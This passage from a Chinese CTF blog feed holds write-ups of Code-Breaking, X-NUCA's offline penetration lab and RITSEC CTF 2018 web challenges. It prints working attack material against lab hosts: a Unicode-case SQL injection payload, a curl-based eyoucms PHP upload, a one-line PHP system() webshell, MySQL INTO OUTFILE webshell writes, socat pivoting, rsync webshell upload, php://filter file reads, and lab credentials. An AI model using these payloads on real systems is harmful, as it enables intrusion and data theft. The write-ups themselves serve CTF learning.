static(ctx, next) &#123;</span><br><span class="line">    await send(ctx, ctx.path)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">async function admin(ctx, next) &#123;</span><br><span class="line">    if(!ctx.session.user) &#123;</span><br><span class="line">        ctx.status = 303</span><br><span class="line">        return ctx.redirect(ctx.router.url('login'))</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    await ctx.render('admin', &#123;</span><br><span class="line">        'user': ctx.session.user</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">async function source(ctx, next) &#123;</span><br><span class="line">    await send(ctx, basename(__filename))</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">main()</span><br></pre></td></tr></table></figure><h4 id="main-code"><a href="#main-code" class="headerlink" title="main code"></a>main code</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">function safeKeyword(keyword) &#123;</span><br><span class="line">    if(isString(keyword) &amp;&amp; !keyword.match(/(union|select|;|\-\-)/is)) &#123;</span><br><span class="line">        return keyword</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    return undefined</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">async function login(ctx, next) &#123;</span><br><span class="line">    if(ctx.method == 'POST') &#123;</span><br><span class="line">        let username = safeKeyword(ctx.request.body['username'])</span><br><span class="line">        let password = safeKeyword(ctx.request.body['password'])</span><br><span class="line"></span><br><span class="line">        let jump = ctx.router.url('login')</span><br><span class="line">        if (username &amp;&amp; password) &#123;</span><br><span class="line">            let user = await ctx.db.get(`SELECT * FROM "users" WHERE "username" = '$&#123;username.toUpperCase()&#125;' AND "password" = '$&#123;password.toUpperCase()&#125;'`)</span><br><span class="line"></span><br><span class="line">            if (user) &#123;</span><br><span class="line">                ctx.session.user = user</span><br><span class="line"></span><br><span class="line">                jump = ctx.router.url('admin')</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        ctx.status = 303</span><br><span class="line">        ctx.redirect(jump)</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        await ctx.render('index')</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>题目中禁用了<code>union</code>和<code>select</code>,但在登录时使用了危险函数<code>toUpperCase()</code></p><p>这里参考p佬的   <a href="https://www.leavesongs.com/HTML/javascript-up-low-ercase-tip.html" target="_blank" rel="noopener">Fuzz中的javascript大小写特性</a></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">"ı".toUpperCase() == I</span><br><span class="line">"ſ".toUpperCase() == S</span><br><span class="line">"K".toLowerCase() == k</span><br></pre></td></tr></table></figure><p>构造payload</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=1&amp;password=' un%c4%b1on %c5%bfelect 1,(%c5%bfelect flag from flags),1'</span><br></pre></td></tr></table></figure><p><img src="7.png" alt></p><p>参考链接</p><p><a href="http://blog.51cto.com/lovexm/1743442" target="_blank" rel="noopener">PHP create_function()代码注入</a></p><p><a href="https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html" target="_blank" rel="noopener">PHP利用PCRE回溯次数限制绕过某些安全限制</a></p><p><a href="http://www.laruence.com/2010/06/08/1579.html" target="_blank" rel="noopener">深悉正则(pcre)最大回溯/递归限制</a></p><p><a href="http://wonderkun.cc/index.html/?p=626" target="_blank" rel="noopener">php &amp; apache2 &amp;操作系统之间的一些黑魔法</a></p><p><a href="https://xz.aliyun.com/t/2347#toc-2" target="_blank" rel="noopener">r-cursive</a></p><p><a href="https://www.leavesongs.com/HTML/javascript-up-low-ercase-tip.html" target="_blank" rel="noopener">Fuzz中的javascript大小写特性</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;年底了，来一发 &lt;code&gt;Code-Break&lt;/code&gt; 入入魂。给无滋无味的预习增添一些色彩&lt;/p&gt;
&lt;p&gt;膜了几位师傅的思路  let‘s go~！&lt;/p&gt;
    
    </summary>
    
    
      <category term="ctf" scheme="https://zo1ro.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>2018X-NUCA线下渗透题总结</title>
    <link href="https://zo1ro.github.io/2018/12/07/xnuca/"/>
    <id>https://zo1ro.github.io/2018/12/07/xnuca/</id>
    <published>2018-12-07T07:41:34.000Z</published>
    <updated>2019-05-09T16:26:34.924Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这次x-npwn比赛时间两天，赛制是第一天先通过一个渗透测试环境，找到第二天要打的pwn题目和攻击机的密码（先找到先getshell，没找到就只能等预定官方时间颁布题目），所以最终都是为了pwn爷爷搭台子：）</p> <a id="more"></a><p>探测flag位置： /etc/xnuca/flag.txt</p><p>得分点IP： /etc/xnuca/score_ip_list.txt</p><p>攻防flag位置： /opt/xnuca/flag.txt</p><p>比赛拓扑</p><p><img src="1.png" alt="1"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">Nmap scan report for 10.109.1.11  -- 22 80 139 443 445</span><br><span class="line">aka 10.109.3.11</span><br><span class="line">Nmap scan report for 10.109.1.12  -- 22 80 139 445</span><br><span class="line">aka 10.109.3.12</span><br><span class="line">Nmap scan report for 10.109.1.13  -- 22 80 139 445</span><br><span class="line">aka 10.109.2.13</span><br><span class="line">Nmap scan report for 10.109.1.14  -- 22 80 139 445</span><br><span class="line">aka 10.109.2.14</span><br><span class="line">Nmap scan report for 10.109.2.15  -- 22 80 139 445</span><br><span class="line">Nmap scan report for 10.109.2.16  -- 22 80 139 445</span><br><span class="line">Nmap scan report for 10.109.2.17  -- 21 22 139 445</span><br><span class="line">Nmap scan report for 10.109.3.18  -- 22 139 445</span><br><span class="line">Nmap scan report for 10.109.3.19  -- 22 139 445 3306</span><br><span class="line">Nmap scan report for 10.109.1.20  -- 22 139 445 873(rsync)</span><br><span class="line">Nmap scan report for 10.109.1.30  -- 22 139 445</span><br></pre></td></tr></table></figure><p>一共三层网络，二层和三层只能通过一层访问，即<strong>10.109.2.0</strong>与<strong>10.109.3.0</strong>只能通过<strong>10.109.1.11-14</strong>访问，通过两层跳板转发至本地。</p><h4 id="socat转发命令"><a href="#socat转发命令" class="headerlink" title="socat转发命令"></a>socat转发命令</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nohup ./socat -v tcp-listen:11480,reuseaddr,fork tcp-connect:10.109.1.14:80 &gt; /dev/null 2&gt;&amp;1 &amp;</span><br></pre></td></tr></table></figure><p>比赛hint</p><p><img src="7.png" alt="7"></p><h3 id="探测题flag位置"><a href="#探测题flag位置" class="headerlink" title="探测题flag位置"></a>探测题flag位置</h3><p> /etc/xnuca/flag.txt</p><h3 id="info1"><a href="#info1" class="headerlink" title="info1"></a>info1</h3><p>10.109.1.11:80</p><p>访问链接自动跳转到https，hint提示与某些端口的https报错信息有关，将443端口转发到本地，查看证书发现用户名和密码</p><p>info1 / helloworldinfo156789</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/etc/xnuca/flag.txt: tance_flag&#123;4e10928055d92c8ac722ff67d4becc2dd57caaf0f0f36ca2d01a0757dd25bbf5&#125;</span><br></pre></td></tr></table></figure><h3 id="info2"><a href="#info2" class="headerlink" title="info2"></a>info2</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">10.109.1.12:80</span><br></pre></td></tr></table></figure><p>hint提示：这个cms应该被发出来getshell方法了吧</p><p>易优cms，文件上传漏洞</p><p><a href="https://www.cesafe.com/7253.html" target="_blank" rel="noopener">eyoucms（易优CMS）前台shell漏洞</a></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[iiebc@localhost ~]$ curl "http://10.109.1.10:16080/index.php/api/Uploadify/preview" -d "data:image/php;base64,PD9waHAKcGhwaW5mbygpOw=="</span><br><span class="line">//phpinfo()</span><br><span class="line">&#123;"jsonrpc" : "2.0", "result" : "http://10.109.1.10:16080/index.php/api/Uploadify/previewpreview/964e4ca056ede906e73d0e45bb7edc3f.php", "id" : "id"&#125;</span><br></pre></td></tr></table></figure><p>直接上传shell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/etc/xnuca/flag.txt: tance_flag&#123;f9b2c7f8b75bbf1f8f8d0e907b526491f921098e5eda0b0a536dea83a4beec8a&#125;</span><br></pre></td></tr></table></figure><p>通过文件上传漏洞上传一个phpmyadmin，然后进入查看后台数据库。</p><p>数据库： root / yuemingxingxi（数据库配置文件中）</p><h3 id="info3"><a href="#info3" class="headerlink" title="info3"></a>info3</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">10.109.1.13:80</span><br></pre></td></tr></table></figure><p><img src="3.png" alt="3"></p><p>存在一个webshell，webshell-path-/theinf03sh3ll.php（来源info1的后台提示）</p><p>password: comeonbaby_1 (来自下面的数据库)</p><p>塞马</p><p>&lt;?php system($_GET[“a”]);</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/etc/xnuca/flag.txt: tance_flag&#123;f61e3535195c4629f10d41561600ae7d0a54355355d11ea5d0f1d0a98e8982c7&#125;</span><br></pre></td></tr></table></figure><h3 id="info4"><a href="#info4" class="headerlink" title="info4"></a>info4</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">10.109.1.14:80</span><br></pre></td></tr></table></figure><p>（弱口令登录）</p><p>phpMyAdmin 4.5.4.1deb2ubuntu2.1</p><p>root / 123456</p><p>select load_file(‘/etc/xnuca/flag.txt’);</p><p>发现没权限读，猜测mysql先写马后执行</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">INSERT INTO webshell( password )</span><br><span class="line">VALUES (</span><br><span class="line">'&lt;?php phpinfo();?&gt;'</span><br><span class="line">);</span><br><span class="line">SELECT *</span><br><span class="line">FROM webshell</span><br><span class="line">INTO OUTFILE '/var/www/html/mm.php';</span><br></pre></td></tr></table></figure><p><img src="6.png" alt="6"></p><p><img src="4.png" alt="4"></p><p><img src="5.png" alt="5"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/etc/xnuca/flag.txt: tance_flag&#123;6949f9b9d4895f8d211f91eda25bd1905d9859c2185aa1da846a71b071800218&#125;</span><br></pre></td></tr></table></figure><h3 id="info5"><a href="#info5" class="headerlink" title="info5"></a>info5</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">10.109.2.15:80</span><br></pre></td></tr></table></figure><p>根据其他题目翻到info5.pcap，分析流量包是一个盲注爆破猜解后台密码</p><p><img src="8.png" alt="8"></p><p><img src="9.png" alt="9"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> os <span class="keyword">import</span> listdir</span><br><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"></span><br><span class="line">wpname = &#123;&#125;</span><br><span class="line">wppass = &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">276</span>, <span class="number">2</span>):</span><br><span class="line">    <span class="keyword">if</span> i == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">with</span> open(<span class="string">'data/news.php'</span>) <span class="keyword">as</span> f:</span><br><span class="line">            data = urllib.parse.unquote(f.read())</span><br><span class="line">            name = data.split(<span class="string">'('</span>)[<span class="number">5</span>].split()[<span class="number">0</span>]</span><br><span class="line">            offset = data.split()[<span class="number">12</span>].split(<span class="string">','</span>)[<span class="number">2</span>]</span><br><span class="line">            ll = data.split(<span class="string">'))'</span>)[<span class="number">-1</span>]</span><br><span class="line">        <span class="keyword">with</span> open(<span class="string">'data/news(%s).php'</span> % str(i + <span class="number">1</span>)) <span class="keyword">as</span> f:</span><br><span class="line">            data = f.read()</span><br><span class="line">            result = <span class="literal">True</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">'shit'</span> <span class="keyword">in</span> data:</span><br><span class="line">                result = <span class="literal">False</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">with</span> open(<span class="string">'data/news(%s).php'</span> % str(i)) <span class="keyword">as</span> f:</span><br><span class="line">            data = urllib.parse.unquote(f.read())</span><br><span class="line">            name = data.split(<span class="string">'('</span>)[<span class="number">5</span>].split()[<span class="number">0</span>]</span><br><span class="line">            offset = data.split()[<span class="number">12</span>].split(<span class="string">','</span>)[<span class="number">2</span>]</span><br><span class="line">            ll = data.split(<span class="string">'))'</span>)[<span class="number">-1</span>]</span><br><span class="line">        <span class="keyword">with</span> open(<span class="string">'data/news(%s).php'</span> % str(i + <span class="number">1</span>)) <span class="keyword">as</span> f:</span><br><span class="line">            data = f.read()</span><br><span class="line">            result = <span class="literal">True</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">'shit'</span> <span class="keyword">in</span> data:</span><br><span class="line">                result = <span class="literal">False</span></span><br><span class="line">    print(name, offset, ll, result)</span><br></pre></td></tr></table></figure><p>后台密码： admin / stopthatphonecall</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/etc/xnuca/flag.txt:</span><br><span class="line">tance_flag&#123;f5b25af4caa57cfd277bf00d13ec13ad906ae32ee0e191311595c7e472bc0e78&#125;</span><br></pre></td></tr></table></figure><h3 id="info6"><a href="#info6" class="headerlink" title="info6"></a>info6</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">10.109.2.16:80</span><br></pre></td></tr></table></figure><p>后台地址和密码在别的靶场翻到</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">info6-webpass-admin-info6adminpass999</span><br><span class="line">info6-adminpath-/admin666info</span><br></pre></td></tr></table></figure><p>DEDECMS</p><p>后台存在文件上传漏洞，上传小马直接getshell</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/etc/xnuca/flag.txt: </span><br><span class="line">tance_flag&#123;1d1b118c8dd98c9fb06fe44a34a7a3a6aa14aed25fab5882b331d8ecbae98f39&#125;</span><br></pre></td></tr></table></figure><h3 id="info7"><a href="#info7" class="headerlink" title="info7"></a>info7</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">10.109.2.17:21</span><br></pre></td></tr></table></figure><p>info7-ftp-version-vsftpd2.3.4</p><p> 别的地方好像存在ftp的版本信息啊</p><p><a href="https://github.com/Belvando/Vsftpd2.3.4_exploit/blob/master/exp.py#L20" target="_blank" rel="noopener">Vsftpd2.3.4_exploit</a></p><p>msf直接打</p><p><a href="https://www.whj.website/blog/2018/09/13/Vsftpd2.3.4%E7%AC%91%E8%84%B8%E6%BC%8F%E6%B4%9E/" target="_blank" rel="noopener">Vsftpd2.3.4笑脸漏洞</a></p><h3 id="info8"><a href="#info8" class="headerlink" title="info8"></a>info8</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">10.109.3.18:22</span><br></pre></td></tr></table></figure><p>提示libssh版本是0.7.5漏洞</p><p>直接拿poc打，绕过认证</p><p><a href="https://paper.seebug.org/720/" target="_blank" rel="noopener">libSSH 认证绕过漏洞(CVE-2018-10933)分析</a></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tance_flag&#123;842e9b3d32b7002c0a005be2ede49f5d0e5c03711a17414e2a34909bec78f51d&#125;</span><br></pre></td></tr></table></figure><h3 id="info9"><a href="#info9" class="headerlink" title="info9"></a>info9</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">10.109.3.19:3306</span><br></pre></td></tr></table></figure><p>mysql后台密码（翻）</p><p>root-yikexiaobaiyang111</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tance_flag&#123;4a805552701cd0708a4319f1c13fe8c929d0b1d5be149e5912fb213ce2d6a66a&#125;</span><br></pre></td></tr></table></figure><h3 id="RSYNC"><a href="#RSYNC" class="headerlink" title="RSYNC"></a>RSYNC</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">10.109.1.20:873</span><br></pre></td></tr></table></figure><p><a href="https://www.jianshu.com/p/615669b7311f" target="_blank" rel="noopener">rsync未授权访问漏洞</a></p><p>查看目标IP存在哪些同步目录：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rsync 192.168.1.10::rsync 192.168.1.10::web/</span><br></pre></td></tr></table></figure><p>下载文件或目录到本地：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rsync -avz 192.168.1.10::web/1.php /rootrsync -avz 10.0.0.12::web/ /var/tmp</span><br></pre></td></tr></table></figure><p>上传文件到服务器</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rsync -avz webshell.php 192.168.1.10::web/</span><br></pre></td></tr></table></figure><p><img src="2.png" alt="2"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tance_flag&#123;cb6d84b1d39823f495f994946ea29f2e7d75b6ab8710d1408ec8fa7a691c2746&#125;</span><br></pre></td></tr></table></figure><h3 id="攻击机"><a href="#攻击机" class="headerlink" title="攻击机"></a>攻击机</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">10.109.1.30:22</span><br></pre></td></tr></table></figure><p>靶场翻到</p><p>attacker / LdyOU6h2M9</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tance_flag&#123;fb0b0b37dc97b4d4f93aba11ac83e7fd138843ee9e83e361a0b7a41add93394e&#125;</span><br></pre></td></tr></table></figure><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>题目涉及到一些cve的复现，师傅们基本都做过，本菜还是要多积累。</p><p>ALL-KILL！tql！！</p><p>PS：pwn才是爷爷，包括后面的铁三和pcb。</p><p>转pwn转pwn</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;这次x-npwn比赛时间两天，赛制是第一天先通过一个渗透测试环境，找到第二天要打的pwn题目和攻击机的密码（先找到先getshell，没找到就只能等预定官方时间颁布题目），所以最终都是为了pwn爷爷搭台子：）&lt;/p&gt;
    
    </summary>
    
    
      <category term="ctf" scheme="https://zo1ro.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>RITSEC CTF 2018 Web-WriteUp</title>
    <link href="https://zo1ro.github.io/2018/11/19/ritsecctf2018/"/>
    <id>https://zo1ro.github.io/2018/11/19/ritsecctf2018/</id>
    <published>2018-11-19T00:42:16.000Z</published>
    <updated>2019-05-09T16:29:02.939Z</updated>
    
    <content type="html"><![CDATA[<p>自闭玩家上线。。</p><a id="more"></a><h2 id="Space-Force-100"><a href="#Space-Force-100" class="headerlink" title="Space Force-100"></a>Space Force-100</h2><blockquote><p>The Space Force has created a portal for the public to learn about and be in awe of our most elite Space Force Fighters. Check it out at <code>fun.ritsec.club:8005</code>!</p><p><em>Author: neon_spandex</em></p></blockquote><p>首页是一个提供查询功能输入框和一些数据</p><p><img src="1.png" alt="1"></p><p>尝试查找数据The Javelin</p><p><img src="2.png" alt="2"></p><p>尝试输入*查询无果，在尝试注入发现报错</p><p><img src="4.png" alt="4"></p><p>发送payload直接出flag（莫名其妙 :( ）。。SS Roosevelt’or 1=1#</p><p><img src="3.png" alt="3"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">RITSEC&#123;hey_there_h4v3_s0me_point$_3ny2Lx&#125;</span><br></pre></td></tr></table></figure><h2 id="The-Tangled-Web-200"><a href="#The-Tangled-Web-200" class="headerlink" title="The Tangled Web-200"></a>The Tangled Web-200</h2><blockquote><p>fun.ritsec.club:8007</p><p><em>Author: jok3r</em></p></blockquote><p>访问网站主页发现有很多相关连的链接，</p><p><img src="5.png" alt="5"></p><p><img src="7.png" alt="7"></p><p>wget一下把文件全部下载下来（wget大法好，后续补上python爬虫脚本）</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget -r -l 0 http://fun.ritsec.club:8007/</span><br></pre></td></tr></table></figure><p><img src="6.png" alt="6"></p><p>发现其中有名为Fl4gggg1337的html文件</p><p>cat一下发现其中并没有flag，但指向另一个名为Stars的html文件</p><p><img src="8.png" alt="8"></p><p>继续访问发现回显一串可疑字符</p><p><img src="9.png" alt="9"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:/ctf/fun.ritsec.club:8007# echo "UklUU0VDe0FSM19ZMFVfRjMzNzFOR18xVF9OMFdfTVJfS1I0QjU/IX0="</span><br><span class="line">|base64 -d</span><br><span class="line">RITSEC&#123;AR3_Y0U_F3371NG_1T_N0W_MR_KR4B5?!&#125;</span><br></pre></td></tr></table></figure><h2 id="Crazy-Train-250"><a href="#Crazy-Train-250" class="headerlink" title="Crazy Train-250"></a>Crazy Train-250</h2><blockquote><p>fun.ritsec.club:3000</p><p><em>Author: hulto</em></p></blockquote><p>进去首页是这样的</p><p><img src="10.png" alt="10"></p><p>点击</p><p><img src="11.png" alt="11"></p><p>源码发现这样一串东西</p><p><img src="12.png" alt="12"></p><p>google发现是ruby写的，，龟龟</p><p><img src="13.png" alt="13"></p><p>发现有个create a post，并没有可疑的东西</p><p><img src="14.png" alt="14"></p><p>源码发现隐藏着一个输入框</p><p><img src="15.png" alt="15"></p><p>通过修改属性，发现可以在这个输入框进行解析</p><p><img src="16.png" alt="16"></p><p><img src="17.png" alt="17"></p><p>最后发现此输入框可以直接命令执行，，，</p><p><img src="18.png" alt="18"></p><p>直接cat flag</p><p><img src="19.png" alt="19"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">RITSEC&#123;W0wzers_who_new_3x3cuting_c0de_to_debug_was_@_bad_idea&#125;</span><br></pre></td></tr></table></figure><h2 id="Archivr-300"><a href="#Archivr-300" class="headerlink" title="Archivr-300"></a>Archivr-300</h2><blockquote><p><strong>Please note that this challenge is currently down. We are working on the issue and will update when it is back up.</strong></p><p>fun.ritsec.club:8004</p><p><em>Author: jwood</em></p></blockquote><p><img src="33.png" alt="33"></p><p>上传文件题，发现有如下限制</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">上传大小5kb</span><br><span class="line">上传文件几分钟后自动销毁</span><br><span class="line">无法上传php混写文件(大小写，混合大小写，php5均无效)，但可以上传pht，phtml，php，zip等</span><br><span class="line">没有扩展或者带有php扩展的自动转换为.dat扩展名</span><br><span class="line">上传后文件名自动更改为  （数字+.txt） 的格式，并可以通过此uri进行访问</span><br><span class="line">未检查content-type，可上传php代码的png文件（并没有用）等等</span><br></pre></td></tr></table></figure><p><img src="35.png" alt="35"></p><p>在download页面url可以看到</p><p><code>http://fun.ritsec.club:8004/index.php?page=download</code></p><p>这里通过</p><p><code>http://fun.ritsec.club:8004/index.php?page=php://filter/convert.base64-encode/resource=download</code></p><p>读取到upload源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> ($_SERVER[<span class="string">'REQUEST_METHOD'</span>] === <span class="string">'POST'</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> ($_FILES[<span class="string">'upload'</span>][<span class="string">'size'</span>] &gt; <span class="number">5000</span>)</span><br><span class="line">&#123; <span class="comment">//max 5KB</span></span><br><span class="line"><span class="keyword">die</span>(<span class="string">"File too large!"</span>);</span><br><span class="line">&#125;</span><br><span 